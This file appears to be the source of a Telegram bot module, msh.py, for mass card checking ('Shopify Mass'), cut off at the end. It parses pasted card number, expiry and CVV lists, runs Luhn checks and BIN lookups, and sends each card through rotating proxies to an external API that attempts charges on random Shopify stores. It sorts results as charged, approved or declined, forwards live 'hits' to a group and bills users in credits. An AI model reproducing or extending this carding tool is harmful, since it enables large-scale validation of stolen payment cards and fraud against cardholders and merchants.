"""msh.py — Shopify Mass (ONE SHOT per proxy-error, WITH proxy rotation + site caching + retries)"""

import re, random, logging, time, string, io, html
import asyncio, aiohttp
from collections import deque
from bin import get_bin_info
# api_limiter removed
from database import (
    get_user_credits, update_user_credits,
    get_active_proxy_strings, get_working_site_urls,
    get_msh_speed, record_check, is_db_admin,
)
from plans import get_user_current_tier
from config import OWNER_NAME, OWNER_USERNAME, BOT_NAME, HIT_DETECTION_GROUP_ID, OWNER_ID
from emojis import PremiumEmoji as E
from api_config import get_api_endpoint, is_site_enabled
from api_parse import get_gateway, get_price_currency
from telegram import InlineKeyboardMarkup, InlineKeyboardButton
from ui import primary, success, danger

logger = logging.getLogger(__name__)

# ═══ SEMAPHORE + INLINE API CALL (no circuit breaker, no rate limit) ═══
MAX_CONCURRENT_API = 15          # ← max parallel API requests
_API_SEM = asyncio.Semaphore(MAX_CONCURRENT_API)
_INLINE_SESSION = None

def _get_inline_session():
    global _INLINE_SESSION
    if _INLINE_SESSION is None or _INLINE_SESSION.closed:
        _INLINE_SESSION = aiohttp.ClientSession(
            timeout=aiohttp.ClientTimeout(total=120, connect=30),
            connector=aiohttp.TCPConnector(
                limit=MAX_CONCURRENT_API * 2,
                limit_per_host=MAX_CONCURRENT_API,
                ssl=False,
                ttl_dns_cache=300,
            ),
        )
    return _INLINE_SESSION

async def api_call(url, params, timeout=45):
    """Parallel API call, max MAX_CONCURRENT_API in-flight."""
    async with _API_SEM:
        try:
            sess = _get_inline_session()
            async with sess.get(url, params=params, timeout=aiohttp.ClientTimeout(total=timeout)) as r:
                if r.status >= 400:
                    return None
                return await r.json(content_type=None)
        except Exception:
            return None

def get_semaphore_stats():
    """Current semaphore usage (for /status or debug)."""
    return {
        "max_concurrent": MAX_CONCURRENT_API,
        "available": _API_SEM._value if hasattr(_API_SEM, "_value") else "?",
        "in_flight": MAX_CONCURRENT_API - (_API_SEM._value if hasattr(_API_SEM, "_value") else 0),
    }

def is_breaker_open(): return False
async def get_breaker_status(): return {"state": "disabled"}

API_TIMEOUT = 90
MSH_CARD_PACING = 0.10
MSH_BREAKER_PAUSE = True
MSH_QUEUE_CHECK_INTERVAL = 1
MAX_CARD_RETRIES = 1

# ═══════════════════════════════════════════════════
# ═══ CLASSIFICATION — UNCHANGED ═══
# ═══════════════════════════════════════════════════
CHARGED_PATTERNS = ["order_paid", "order_placed", "charged", "thank you", "payment successful", "payment_complete", "captured", "paid"]
APPROVED_PATTERNS = ["3d_authentication", "3ds_required", "3d_secure", "3ds2", "insufficient_funds", "insufficient funds", "incorrect_zip", "incorrect zip", "invalid_cvc", "invalid cvc", "otp_required", "otp required", "otp", "verification_required", "authenticate_successful", "authenticate_attempt_successful"]
DECLINED_PATTERNS = ["card_declined", "generic_error", "do not honor", "expired", "invalid_token", "invalid token", "token not found", "error processing card", "missing_parameters", "processor_declined", "payments_credit_card_brand_not_supported", "payments_credit_card_base_expired", "payments_credit_card_verification_value_invalid", "payments_payment_flexibility_terms_id_mismatch", "payments_credit_card_session_id", "validation_custom", "tax_tax_inclusivity_mismatch", "order subtotal is less than", "minimum value for your order", "suspected fraud", "fraud", "blocked by cartwatch", "processing_error", "no payment method available", "invalid_purchase_type", "merchandise_product_not_published", "fulfillment type is required", "shipinsure items", "buyer_identity_presentment_currency", "this address field is invalid", "logo, embroidery, text and oversize", "this payment has been blocked", "order prevented", "waiting_pending_terms", "amount_too_small", "invalid_payment_method", "sorry, your order contains only", "checkout is not allowed", "quantity for", "unable", "declined", "failed", "not supported", "payments_proposed_gateway_unavailable"]
INFRA_ERRORS = [
    "step 1 failed", "step 2 failed", "step 3 failed", "step 4 failed",
    "step 5 failed", "step 6 failed", "step 7 failed", "step 8 failed",
    "step 9 failed", "step 10 failed", "missing stableid", "missing buildid",
    "missing sourcetoken", "permalink returned", "403 forbidden", "429",
    "connection timed out", "curl:", "failed to perform", "site requires login",
    "failed to get token", "failed to get session token", "failed to get sessiontoken",
    "no valid products", "not shopify", "connection error", "could not resolve host",
    "connect tunnel failed", "could not extract sessiontoken", "404 not found",
    "internal error",
    # ═══ PROXY / SITE FAILURE PATTERNS (should NOT be Declined) ═══
    "proxy fetch failed", "no direct fallback", "proxy responded with non 200",
    "402 payment required", "site error:", "404 payment required",
    "proxy error", "bad gateway", "site fetch failed", "could not fetch site",
    "site requires login", "no available products", "site incompatible",
    "eof", "timeout on site",
]

# ═══ NON-SHOPIFY-PAYMENTS GATEWAY DETECT — treat as error to retry with
# different site (or skip). User wants Shopify Payments only.
NON_SHOPIFY_PAYMENTS_GATEWAYS = [
    "stripe card payments", "oceanpayment", "moneris", "kreditkarte",
    "airwallex", "creditcard", "shopify creditcard",
]

active_mass_checks = {}
pending_mass_checks = {}
group_limiter = asyncio.Semaphore(2)
_BIN_CACHE = {}
_BIN_TTL = 3600


async def _get_bin_cached(bin6):
    now = time.time()
    entry = _BIN_CACHE.get(bin6)
    if entry and now - entry[0] < _BIN_TTL:
        return entry[1]
    try:
        info = await get_bin_info(bin6)
    except Exception:
        info = {}
    if info and not info.get("error"):
        _BIN_CACHE[bin6] = (now, info)
    return info or {}


def gen_sid():
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))


def luhn(cn):
    cn = re.sub(r'\D', '', cn)
    if not cn.isdigit() or len(cn) < 13 or len(cn) > 19:
        return False
    d = [int(x) for x in cn]
    for i in range(len(d) - 2, -1, -2):
        d[i] *= 2
        if d[i] > 9:
            d[i] -= 9
    return sum(d) % 10 == 0


def parse_card(s):
    s = s.strip()
    pats = [
        r'^(\d{13,19})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})$',
        r'^(\d{13,19})\/(\d{1,2})\/(\d{2,4})\/(\d{3,4})$',
        r'^(\d{13,19}):(\d{1,2}):(\d{2,4}):(\d{3,4})$',
        r'^(\d{13,19})\s+(\d{1,2})\s+(\d{2,4})\s+(\d{3,4})$',
    ]
    for pat in pats:
        m = re.match(pat, s)
        if m:
            cc, mm, yy, cvv = m.groups()
            mm = mm.zfill(2)
            if len(yy) == 4:
                yy = yy[2:]
            return cc, mm, yy, cvv
    return None


def extract_cards(t):
    if not t:
        return []
    cards, seen = [], set()
    t = t.replace('\r', '')
    pat = re.compile(r'(\d{13,19})\s*[|/:,\t ]\s*(\d{1,2})\s*[|/:,\t ]\s*(\d{2,4})\s*[|/:,\t ]\s*(\d{3,4})')
    for match in pat.finditer(t):
        cc, mm, yy, cvv = match.groups()
        cc = re.sub(r'\D', '', cc)
        if 13 <= len(cc) <= 19:
            mm = mm.zfill(2)
            if len(yy) == 4:
                yy = yy[2:]
            s = f"{cc}|{mm}|{yy}|{cvv}"
            if s not in seen:
                seen.add(s)
                cards.append(s)
                if len(cards) >= 100000:
                    break
    return cards


def clean_px(p):
    p = p.strip()
    if p.startswith("http://"):
        return p[7:]
    if p.startswith("https://"):
        return p[8:]
    return p


def _classify_response(response_text):
    rl = str(response_text).lower()
    if any(k in rl for k in INFRA_ERRORS):
        return "error"
    if any(k in rl for k in CHARGED_PATTERNS):
        return "charged"
    if any(k in rl for k in APPROVED_PATTERNS):
        return "approved"
    # ═══ EXTRA GUARD: catch proxy/site errors even if INFRA missed them ═══
    if any(k in rl for k in (
        'site error:', 'proxy fetch failed', 'no direct fallback',
        'proxy responded with non 200', 'connection reset by peer',
        'read: connection reset', 'read tcp', 'proxy error',
    )):
        return "error"
    return "declined"


def _is_non_shopify_payments_gateway(gateway):
    """Detect non-Shopify-Payments gateways. Returns True if gateway is
    Stripe/Oceanpayment/Moneris/Kreditkarte/Airwallex/Creditcard etc."""
    if not gateway:
        return False
    gl = str(gateway).strip().lower()
    if gl in ("shopify payments", "shopify"):
        return False
    return any(g in gl for g in NON_SHOPIFY_PAYMENTS_GATEWAYS)


# ═══════════════════════════════════════════════════
# ═══ NEW: PROXY MANAGER + SITE CACHE HELPERS ═══
# ═══════════════════════════════════════════════════

def mask_proxy(proxy):
    try:
        if not proxy:
            return "None"
        if '@' in proxy:
            parts = proxy.split('@')
            if len(parts) == 2:
                return f"***@{parts[1]}"
        return proxy[:15] + "***" if len(proxy) > 15 else "***"
    except Exception:
        return "***"


class SessionProxyManager:
    """
    Per-session proxy rotation with cooldown.
    Does NOT change card format, classification, or API URL structure.
    Only affects WHICH proxy is chosen for each attempt.
    """

    SUCCESS_INDICATORS = [
        'card_declined', 'order_paid', 'charged', 'approved',
        'insufficient_funds', 'invalid_cvc', 'incorrect_cvc',
        '3ds_required', 'generic_error', 'do not honor',
        'expired_card', 'incorrect_zip', 'fraud_suspected',
    ]
    PROXY_ERROR_PATTERNS = [
        'connection error', 'connection refused', 'connection reset',
        'timeout', 'timed out', 'connect timeout',
        'could not resolve host', 'dns error',
        'proxy authentication', 'auth failed',
        'tunnel failed', 'socks error', 'ssl error',
        'network unreachable', 'host unreachable',
        'connection aborted', 'broken pipe', 'socket error',
        'proxy error', 'bad gateway', 'proxy dead',
        # ═══ NEW patterns from real failures ═══
        'read: connection reset', 'read tcp', 'write tcp',
        'no direct fallback', 'proxy fetch failed',
        'proxy responded with non 200', '402 payment required',
        'site error:', 'eof', 'proxy provider',
        'i/o timeout', 'no route to host',
    ]

    def __init__(self, proxies_list, session_id):
        self.session_id = session_id
        raw = list(set(p for p in proxies_list if p))
        self.all_proxies = [p for p in (self._norm(x) for x in raw) if p]
        self.queue = deque(self.all_proxies)
        self.failed = {}
        self.success_counts = {p: 0 for p in self.all_proxies}
        self.total_uses = 0
        logger.info(f"[ProxyMgr] {len(self.all_proxies)} proxies initialized for session {session_id}")

    def _norm(self, proxy):
        if not proxy or not proxy.strip():
            return None
        p = proxy.strip()
        if p.startswith(('http://', 'https://')):
            return p
        if p.startswith('socks5://'):
            return 'http://' + p[9:]
        if '@' in p and ':' in p.split('@')[0]:
            return f'http://{p}'
        parts = p.split(':')
        if len(parts) == 2 and parts[1].isdigit():
            return f'http://{p}'
        if len(parts) == 4 and parts[1].isdigit():
            host, port, user, pwd = parts
            return f'http://{user}:{pwd}@{host}:{port}'
        return f'http://{p}'

    def get_next(self):
        if not self.all_proxies:
            return None
        now = time.time()
        attempts = 0
        mx = len(self.all_proxies) * 2
        while attempts < mx:
            if not self.queue:
                self.queue = deque(self.all_proxies)
            proxy = self.queue.popleft()
            if proxy in self.failed:
                cd = self.failed[proxy].get('cooldown_until', 0)
                if now < cd:
                    self.queue.append(proxy)
                    attempts += 1
                    continue
                del self.failed[proxy]
            self.queue.append(proxy)
            self.total_uses += 1
            return proxy
        # All on cooldown — force the soonest-to-expire
        if self.failed:
            best = min(self.failed.keys(),
                       key=lambda p: self.failed[p].get('cooldown_until', float('inf')))
            self.total_uses += 1
            return best
        return None

    def is_proxy_error(self, message, http_status=None):
        if not message:
            return False
        ml = str(message).lower()
        for ok in self.SUCCESS_INDICATORS:
            if ok in ml:
                return False
        # Only skip status check for AUTH (401/403) or SERVER DOWN (5xx)
        # HTTP 200 MUST check body — API can return 200 with proxy error body
        if http_status in (401, 403):
            return False
        if http_status and http_status >= 500:
            return False
        # HTTP 200, 400, 402, 422 — check body for proxy error patterns
        return any(pat in ml for pat in self.PROXY_ERROR_PATTERNS)

    def report(self, proxy, message, http_status=None):
        now = time.time()
        if self.is_proxy_error(message, http_status):
            if proxy not in self.failed:
                self.failed[proxy] = {'count': 0, 'cooldown_until': 0}
            self.failed[proxy]['count'] += 1
            cds = [30, 60, 120, 300, 600, 900, 1800]
            idx = min(self.failed[proxy]['count'] - 1, len(cds) - 1)
            self.failed[proxy]['cooldown_until'] = now + cds[idx]
            logger.warning(
                f"[ProxyMgr] FAIL {mask_proxy(proxy)} "
                f"#{self.failed[proxy]['count']} cooldown={cds[idx]}s"
            )
        else:
            self.success_counts[proxy] = self.success_counts.get(proxy, 0) + 1
            self.failed.pop(proxy, None)

    def get_stats(self):
        active = len([p for p in self.all_proxies if p not in self.failed])
        return {
            'total': len(self.all_proxies),
            'active': active,
            'failed': len(self.failed),
            'uses': self.total_uses,
        }


def _get_session_good_sites(session):
    """Per-session cache of sites that haven't been marked bad."""
    if session is None:
        return []
    cache = session.get('good_sites_cache')
    if cache is not None:
        return cache
    all_sites = get_working_site_urls() or []
    bad = session.get('bad_sites') or {}
    th = session.get('bad_site_threshold', 5)
    good = [s for s in all_sites if bad.get(s, 0) < th] if bad else list(all_sites)
    if not good:
        good = list(all_sites)
    session['good_sites_cache'] = good
    return good


def _mark_site_bad(session, site):
    """Increment site failure counter; evict from good-cache after threshold."""
    if session is None or not site:
        return
    bad = session.setdefault('bad_sites', {})
    bad[site] = bad.get(site, 0) + 1
    th = session.get('bad_site_threshold', 5)
    if bad[site] < th:
        return
    cache = session.get('good_sites_cache')
    if cache is not None:
        try:
            cache.remove(site)
        except ValueError:
            pass
        if not cache:
            session['good_sites_cache'] = None


# ═══════════════════════════════════════════════════
# ═══ MODIFIED: check_one with proxy rotation + site retry ═══
# Card format, classification, return structure — SAME
# ═══════════════════════════════════════════════════

async def check_one(card, ui, session, api_url, site_on, stop_ev=None):
    """Single-attempt card check. No retries."""
    parsed = parse_card(card)
    if not parsed:
        return {"success": False, "error": "Bad format", "card": card, "is_luhn_failed": True}

    cc, mm, yy, cvv = parsed
    if not luhn(cc):
        return {"success": False, "error": "Luhn", "card": card, "is_luhn_failed": True}

    info = await _get_bin_cached(cc[:6])
    b = (info.get("scheme") or "N/A").title()
    is_ = info.get("bank") or "N/A"
    co = info.get("country") or "Unknown"
    cof = info.get("country_emoji", "")

    if stop_ev and stop_ev.is_set():
        return {"success": False, "error": "Stopped", "card": card}

    proxy_mgr = session.get('proxy_manager') if session else None
    if not proxy_mgr:
        return {"success": False, "error": "No proxy manager", "card": card, "is_proxy_error": True}

    proxy = proxy_mgr.get_next()
    if not proxy:
        return {"success": False, "error": "No proxies available", "card": card, "is_proxy_error": True}

    px = clean_px(proxy)

    if site_on:
        good = _get_session_good_sites(session)
        site = random.choice(good) if good else None
    else:
        site = None

    cstr = f"{cc}|{mm}|{yy}|{cvv}"
    from urllib.parse import quote as _q
    if site_on and site:
        final_url = f"{api_url}?cc={_q(cstr)}&proxy={_q(px)}&site={_q(site)}"
    else:
        final_url = f"{api_url}?cc={_q(cstr)}&proxy={_q(px)}"

    ar = await api_call(final_url, None, timeout=API_TIMEOUT)

    if ar is None:
        proxy_mgr.report(proxy, "connection error", None)
        return {"success": False, "error": "API Timeout", "card": card}

    response_text = str(ar.get("Response", ar.get("response", "")))
    is_px_err = proxy_mgr.is_proxy_error(response_text, 200)
    proxy_mgr.report(proxy, response_text, 200)

    if is_px_err:
        if site: _mark_site_bad(session, site)
        return {"success": False, "error": f"Proxy: {response_text[:60]}", "card": card}

    category = _classify_response(response_text)
    if category in ("charged", "approved", "declined"):
        gw = get_gateway(ar)
        if _is_non_shopify_payments_gateway(gw):
            if site: _mark_site_bad(session, site)
            return {"success": False, "error": f"NON_SHOPIFY_GW: {gw}", "card": card}
        return {"success": True, "api_response": ar, "card": card, "brand": b,
                "issuer": is_, "country": co, "country_flag": cof,
                "proxy_status": ar.get("Proxy", "Unknown"), "category_hint": category}

    if site: _mark_site_bad(session, site)
    return {"success": False, "error": f"Infra: {response_text[:60]}", "card": card}

# ═══════════════════════════════════════════════════
# ═══ UI FORMATTERS — UNCHANGED ═══
# ═══════════════════════════════════════════════════

def fmt_mass(r, ui):
    if not r.get("success"):
        err = r.get("error", "?")
        if r.get("is_luhn_failed"):
            return f"❌ Luhn <code>{r.get('card', '')}</code>", "declined"
        if r.get("is_proxy_error"):
            return f"⚠️ Proxy <code>{r.get('card', '')}</code>", "error"
        return f"⚠️ Err <code>{r.get('card', '')}</code>: {err}", "error"

    ar = r.get("api_response", {})
    cd, b, is_ = r.get("card", ""), r.get("brand", "N/A"), r.get("issuer", "N/A")
    co, cof, px = r.get("country", "?"), r.get("country_flag", ""), r.get("proxy_status", "?")
    rt = str(ar.get("Response", "N/A")).replace("\\", "").replace("/", "").replace('"', "").replace("'", "")
    gw = get_gateway(ar)
    price_val, currency, sym, _ = get_price_currency(ar)
    gw_price = f"{gw} [{sym}{price_val:.2f}]"
    cat = r.get("category_hint") or _classify_response(rt)

    if cat == "charged":
        st = f"<b>𝘾𝙝𝙖𝙧𝙜𝙚𝙙</b> {E.FIRE}"
    elif cat == "approved":
        st = f"<b>𝘼𝙥𝙥𝙧𝙤𝙫𝙚𝙙</b> {E.APPROVED}"
    else:
        st = f"<b>𝘿𝙚𝙘𝙡𝙞𝙣𝙚𝙙</b> {E.DECLINED}"

    uid, fn = ui.get("id", "?"), ui.get("first_name", "User")
    tier = get_user_current_tier(uid)
    pxe = E.SUCCESS if str(px).lower() == "live" else E.DECLINED

    return (f"<blockquote>{E.THUNDER} <b>Status</b> ↬ {st}</blockquote>\n"
            f"{E.CARD} <b>𝐂𝐚𝐫𝐝</b>\n⤷ <code>{cd}</code>\n"
            f"{E.GATE} <b>Gw</b> ↬ <i>{gw_price}</i>\n"
            f"{E.RESPONSE} <b>Resp</b> ↬ <b>{rt}</b>\n"
            f"<blockquote><b>𝑩𝒓𝒂𝒏𝒅</b> ↬ \"{b}\"\n<b>𝑩𝒂𝒏𝒌</b> ↬ \"{is_}\"\n"
            f"<b>𝑪𝒐𝒖𝒏𝒕𝒓𝒚</b> ↬ {cof} \"{co}\"</blockquote>\n"
            f"{E.USER} <b>User</b> ↬ <a href='tg://user?id={uid}'>{fn}</a> <code>[{tier}]</code>\n"
            f"{E.LINK} <b>Dev</b> ↬ <a href='https://t.me/{OWNER_USERNAME}'>{OWNER_NAME}</a> / {E.PX} {pxe}"), cat


def fmt_hit(r, ui):
    ar = r.get("api_response", {})
    rt = ar.get("Response", "N/A").replace("\\", "").replace("/", "").replace('"', "").replace("'", "")
    gw = get_gateway(ar)
    price_val, currency, sym, _ = get_price_currency(ar)
    gw_price = f"{gw} [{sym}{price_val:.2f}]"
    cd = r.get("card", "N/A")
    b = r.get("brand", "N/A")
    is_ = r.get("issuer", "N/A")
    co = r.get("country", "?")
    cof = r.get("country_flag", "")
    uid, fn = ui.get("id", "?"), ui.get("first_name", "User")
    tier = get_user_current_tier(uid)
    rl = rt.lower()

    if any(k in rl for k in CHARGED_PATTERNS):
        st = f"<b>𝘾𝙝𝙖𝙧𝙜𝙚𝙙</b> {E.FIRE}"
    elif "insufficient" in rl:
        st = f"<b>𝙄𝙣𝙨𝙪𝙛𝙛𝙞𝙘𝙞𝙚𝙣𝙩</b> {E.MONEY}"
    elif "otp" in rl or "3d" in rl:
        st = f"<b>𝙊𝙏𝙋/3𝘿𝙎</b> {E.LOCK}"
    else:
        st = f"<b>𝘼𝙥𝙥𝙧𝙤𝙫𝙚𝙙</b> {E.APPROVED}"

    return (f"<blockquote>{E.FIRE} <b>Hit</b> ↬ {st}</blockquote>\n"
            f"{E.GATE} <b>Gw</b> ↬ <i>{gw_price}</i>\n"
            f"{E.RESPONSE} <b>Resp</b> ↬ <b>{rt}</b>\n"
            f"{E.USER} <b>User</b> ↬ <a href='tg://user?id={uid}'>{fn}</a> <code>[{tier}]</code>\n"
            f"{E.HIT} <b>From</b> ↬ <a href='https://t.me/{BOT_NAME}'>{BOT_NAME}</a>")


def fmt_prog(stats, sid):
    return (f"<blockquote>{E.THUNDER} <b>SHOPIFY MASS</b> {E.SPARKLE}</blockquote>\n"
            f"{E.KEY} <b>Session:</b> <code>{sid}</code>\n"
            f"{E.STATS} <b>Progress:</b> <code>{stats.get('processed', 0)}/{stats['total']}</code>")


def get_msh_keyboard(stats, last_cc, last_status, sid):
    cm1 = primary(f"• {last_cc} •", cb='u8')
    status_btn = primary(f"• 𝙍𝙀𝙎𝙋𝙊𝙉𝙎𝙀 ➜ {last_status} •", cb='u8')
    cm_charged = success(f"• 𝘾𝙃𝘼𝙍𝙂𝙀𝘿 🔥 ➜ [ {stats.get('charged', 0)} ] •", cb='x')
    cm3 = success(f"• 𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿 ✅ ➜ [ {stats.get('approved', 0)} ] •", cb='x')
    cm4 = danger(f"• 𝘿𝙀𝘾𝙇𝙄𝙉𝙀𝘿 ❌ ➜ [ {stats.get('declined', 0)} ] •", cb='x')
    cm5 = primary(f"• 𝙏𝙊𝙏𝘼𝙇 👻 ➜ [ {stats.get('total', 0)} ] •", cb='x')
    cm_err = danger(f"• 𝙀𝙍𝙍𝙊𝙍 ⚠️ ➜ [ {stats.get('error', 0)} ] •", cb='x')
    stop_btn = danger(f"[ 𝙎𝙏𝙊𝙋 ]", cb=f'msh_stop_{sid}')
    return InlineKeyboardMarkup([[cm1], [status_btn], [cm_charged], [cm3], [cm4], [cm5], [cm_err], [stop_btn]])


def fmt_final(stats, elapsed, un, stopped=False, sid=None):
    h, s = ("Status", "Stopped ⏹️") if stopped else ("Summary", "Final ✅")
    return (f"<blockquote>{E.SUCCESS} <b>{h}</b> ↬ {s}</blockquote>\n"
            f"{E.KEY} <b>Session</b> ↬ <code>{sid or 'N/A'}</code>\n"
            f"{E.STATS} <b>Total</b> ↬ <code>{stats['total']}</code>\n"
            f"{E.APPROVED} <b>Checked</b> ↬ <code>{stats.get('processed', 0)}/{stats['total']}</code>\n"
            f"{E.FIRE} <b>Charged</b> ↬ <code>{stats['charged']}</code>\n"
            f"{E.APPROVED} <b>Approved</b> ↬ <code>{stats['approved']}</code>\n"
            f"{E.ERROR} <b>Declined</b> ↬ <code>{stats['declined']}</code>\n"
            f"{E.WARNING} <b>Errors</b> ↬ <code>{stats['error']}</code>\n"
            f"{E.CLOCK} <b>Time</b> ↬ <code>{elapsed}s</code>\n"
            f"{E.USER} <b>By</b> ↬ <code>{un}</code>")


def format_stopped_response(stats, elapsed, un, sid):
    return fmt_final(stats, elapsed, un, stopped=True, sid=sid)


async def send_r(bot, chat, text, retries=2):
    for a in range(retries):
        try:
            return await bot.send_message(chat_id=chat, text=text,
                                          parse_mode="HTML",
                                          disable_web_page_preview=True)
        except Exception as e:
            if ("flood" in str(e).lower() or "too many" in str(e).lower()) and a < retries - 1:
                await asyncio.sleep(2 * (a + 1))
            else:
                return None
    return None


# ═══════════════════════════════════════════════════
# ═══ MODIFIED: process_one — passes session, drops unused args ═══
# ═══════════════════════════════════════════════════

async def process_one(card, ui, stats, ctx, upd, uid, stop_ev, mid, cid,
                      sid, inc_app, results_data, api_url, site_on):
    pd = active_mass_checks.get(sid)
    r = None
    try:
        if stop_ev.is_set():
            return
        r = await check_one(card, ui, pd, api_url, site_on, stop_ev)
        if stop_ev.is_set() or r is None:
            return

        fmt, cat = fmt_mass(r, ui)
        stats["processed"] += 1

        if cat == "error":
            stats["error"] += 1
            results_data[card] = {
                "card": card, "status": "ERROR",
                "response": str(r.get("error", "Unknown")).replace('\n', ' '),
                "gateway": "-", "price": "-"
            }
            return

        stats["checked"] += 1
        if cat == "charged":
            stats["charged"] += 1
        elif cat == "approved":
            stats["approved"] += 1
        elif cat == "declined":
            stats["declined"] += 1
        else:
            stats["declined"] += 1

        if not r.get("success"):
            results_data[card] = {
                "card": card, "status": "ERROR",
                "response": str(r.get("error", "Unknown")).replace('\n', ' '),
                "gateway": "-", "price": "-"
            }
        else:
            ar = r.get("api_response", {})
            results_data[card] = {
                "card": card, "status": cat.upper(),
                "response": str(ar.get("Response", "N/A")).replace('\n', ' '),
                "gateway": get_gateway(ar),
                "price": get_price_currency(ar)[3],
            }

        try:
            if cat in ("charged", "approved", "declined"):
                record_check(uid, cat, "Shopify Mass", card)
        except Exception:
            pass

        if cat in ("charged", "approved"):
            resp_l = str(r.get("api_response", {}).get("Response", "")).lower()
            is_3ds = any(k in resp_l for k in ["3d_authentication", "3ds_required",
                                                "3d_secure", "3ds2", "otp"])
            if not is_3ds:
                async with group_limiter:
                    await asyncio.sleep(1)
                    try:
                        await send_r(ctx.bot, HIT_DETECTION_GROUP_ID, fmt_hit(r, ui))
                    except Exception:
                        pass

        should = (cat == "charged") or (inc_app and cat == "approved")
        if should:
            await asyncio.sleep(1.5)
            sent_msg = await send_r(ctx.bot, ui.get("id"), fmt)
            if sent_msg and cat == "charged":
                try:
                    await ctx.bot.pin_chat_message(chat_id=ui.get("id"),
                                                    message_id=sent_msg.message_id)
                except Exception:
                    pass
    finally:
        if not pd:
            return
        pd["last_cc"] = card
        if r and r.get("success"):
            pd["last_status"] = str(r.get("api_response", {}).get("Response", "N/A")) \
                .replace("\\", "").replace("/", "").replace('"', "").replace("'", "")[:22]
        else:
            pd["last_status"] = "ERROR"

        if stats["processed"] % 5 == 0 or stats["processed"] == stats["total"]:
            if time.time() - pd.get("last_progress_update", 0) > 2:
                pd["last_progress_update"] = time.time()
                try:
                    await ctx.bot.edit_message_text(
                        chat_id=pd["chat_id"], message_id=pd["message_id"],
                        text=fmt_prog(stats, sid), parse_mode="HTML",
                        disable_web_page_preview=True,
                        reply_markup=get_msh_keyboard(stats, pd["last_cc"],
                                                       pd["last_status"], sid))
                except Exception:
                    pass


# ═══════════════════════════════════════════════════
# ═══ MODIFIED: process_mass — adds proxy manager + session fields ═══
# ═══════════════════════════════════════════════════

async def process_mass(cards, ui, upd, ctx, inc_app):
    uid, fn, sid = ui.get("id"), ui.get("first_name"), gen_sid()
    proxies = get_active_proxy_strings(OWNER_ID) or []
    if not proxies:
        await upd.message.reply_text(f"{E.WARNING} No proxies.", parse_mode="HTML")
        return
    site_on = is_site_enabled()
    sites = (get_working_site_urls() or []) if site_on else []
    api_url = get_api_endpoint()

    try:
        msh_speed = get_msh_speed()
    except Exception:
        msh_speed = 5
    if msh_speed > 20:
        msh_speed = 20
    if msh_speed < 1:
        msh_speed = 1

    stats = {"total": len(cards), "checked": 0, "charged": 0, "approved": 0,
             "declined": 0, "error": 0, "processed": 0}
    results_data = {}
    start = time.time()
    stop_ev = asyncio.Event()

    # ═══ NEW: per-session proxy manager + site bad-cache ═══
    proxy_mgr = SessionProxyManager(proxies, sid)

    active_mass_checks[sid] = {
        "stopped": False, "stop_event": stop_ev, "message_id": None,
        "start_time": start, "stats": stats, "workers": [], "user_id": uid,
        "chat_id": None, "session_id": sid, "last_progress_update": 0,
        "last_cc": "NONE", "last_status": "PENDING",
        # ═══ NEW fields ═══
        "proxy_manager": proxy_mgr,
        "bad_sites": {},
        "good_sites_cache": None,
        "bad_site_threshold": 5,
    }

    pm = await upd.message.reply_text(
        text=fmt_prog(stats, sid), parse_mode="HTML",
        disable_web_page_preview=True,
        reply_markup=get_msh_keyboard(stats, "NONE", "PENDING", sid))
    active_mass_checks[sid]["message_id"] = pm.message_id
    active_mass_checks[sid]["chat_id"] = pm.chat_id
    sem = asyncio.Semaphore(msh_speed)

    async def _c(card, idx):
        if stop_ev.is_set():
            return
        async with sem:
            if stop_ev.is_set():
                return
            await asyncio.sleep(MSH_CARD_PACING)
            t = asyncio.create_task(process_one(
                card, ui, stats, ctx, upd, uid, stop_ev,
                active_mass_checks[sid]["message_id"],
                active_mass_checks[sid]["chat_id"],
                sid, inc_app, results_data, api_url, site_on))
            active_mass_checks[sid]["workers"].append(t)
            try:
                await t
            except asyncio.CancelledError:
                return

    tasks = [asyncio.create_task(_c(c, i)) for i, c in enumerate(cards)]
    for t in asyncio.as_completed(tasks):
        if stop_ev.is_set():
            for x in tasks:
                if not x.done():
                    x.cancel()
            break
        try:
            await t
        except asyncio.CancelledError:
            continue

    active_mass_checks[sid]["workers"].clear()
    elapsed, stopped = round(time.time() - start, 2), stop_ev.is_set()
    if get_user_credits(uid) != float('inf') and not stopped:
        update_user_credits(uid, -1)
    pd = active_mass_checks.pop(sid, None)

    if pd and pd.get("chat_id") and pd.get("message_id"):
        try:
            await ctx.bot.edit_message_text(
                chat_id=pd["chat_id"], message_id=pd["message_id"],
                text=fmt_final(stats, elapsed, fn, stopped, sid),
                parse_mode="HTML", disable_web_page_preview=True, reply_markup=None)
        except Exception:
            pass

    txt = (f"=========== MSH SESSION SUMMARY ===========\n"
           f"Session ID : {sid}\nTotal CC   : {stats['total']}\n"
           f"Charged    : {stats['charged']}\nApproved   : {stats['approved']}\n"
           f"Declined   : {stats['declined']}\nErrors     : {stats['error']}\n"
           f"Time       : {elapsed}s\n"
           f"Status     : {'STOPPED' if stopped else 'COMPLETED'}\n"
           f"===========================================\n\n"
           f"CARD | STATUS | RESPONSE | GATEWAY | PRICE\n" + "-" * 60 + "\n")
    for item in results_data.values():
        txt += (f"{item['card']} | {item['status']} | "
                f"{str(item['response']).replace(chr(10), ' ')} | "
                f"{item['gateway']} | {item['price']}\n")

    file_obj = io.BytesIO(txt.encode('utf-8'))
    file_obj.name = f"MSH_{sid}.txt"
    try:
        await ctx.bot.send_document(
            chat_id=uid, document=file_obj,
            caption=(f"✅ <b>Session Completed!</b>\n\n"
                     f"{E.STATS} <b>Total:</b> <code>{stats['total']}</code>\n"
                     f"{E.FIRE} <b>Charged:</b> <code>{stats['charged']}</code>\n"
                     f"{E.APPROVED} <b>Approved:</b> <code>{stats['approved']}</code>\n"
                     f"{E.ERROR} <b>Declined:</b> <code>{stats['declined']}</code>\n"
                     f"{E.WARNING} <b>Errors:</b> <code>{stats['error']}</code>"),
            parse_mode="HTML")
    except Exception:
        pass


# ═══════════════════════════════════════════════════
# ═══ HANDLERS — UNCHANGED ═══
# ═══════════════════════════════════════════════════

async def handle_msh_command(update, context):
    try:
        uid, un, fn = (update.effective_user.id,
                       update.effective_user.username,
                       update.effective_user.first_name)
        if get_user_current_tier(uid) == "Trial":
            await update.message.reply_text(f"{E.WARNING} Trial not allowed.", parse_mode="HTML")
            return
        for s, d in active_mass_checks.items():
            if d["user_id"] == uid:
                await update.message.reply_text(f"{E.WARNING} Already running.", parse_mode="HTML")
                return
        if not get_active_proxy_strings(OWNER_ID):
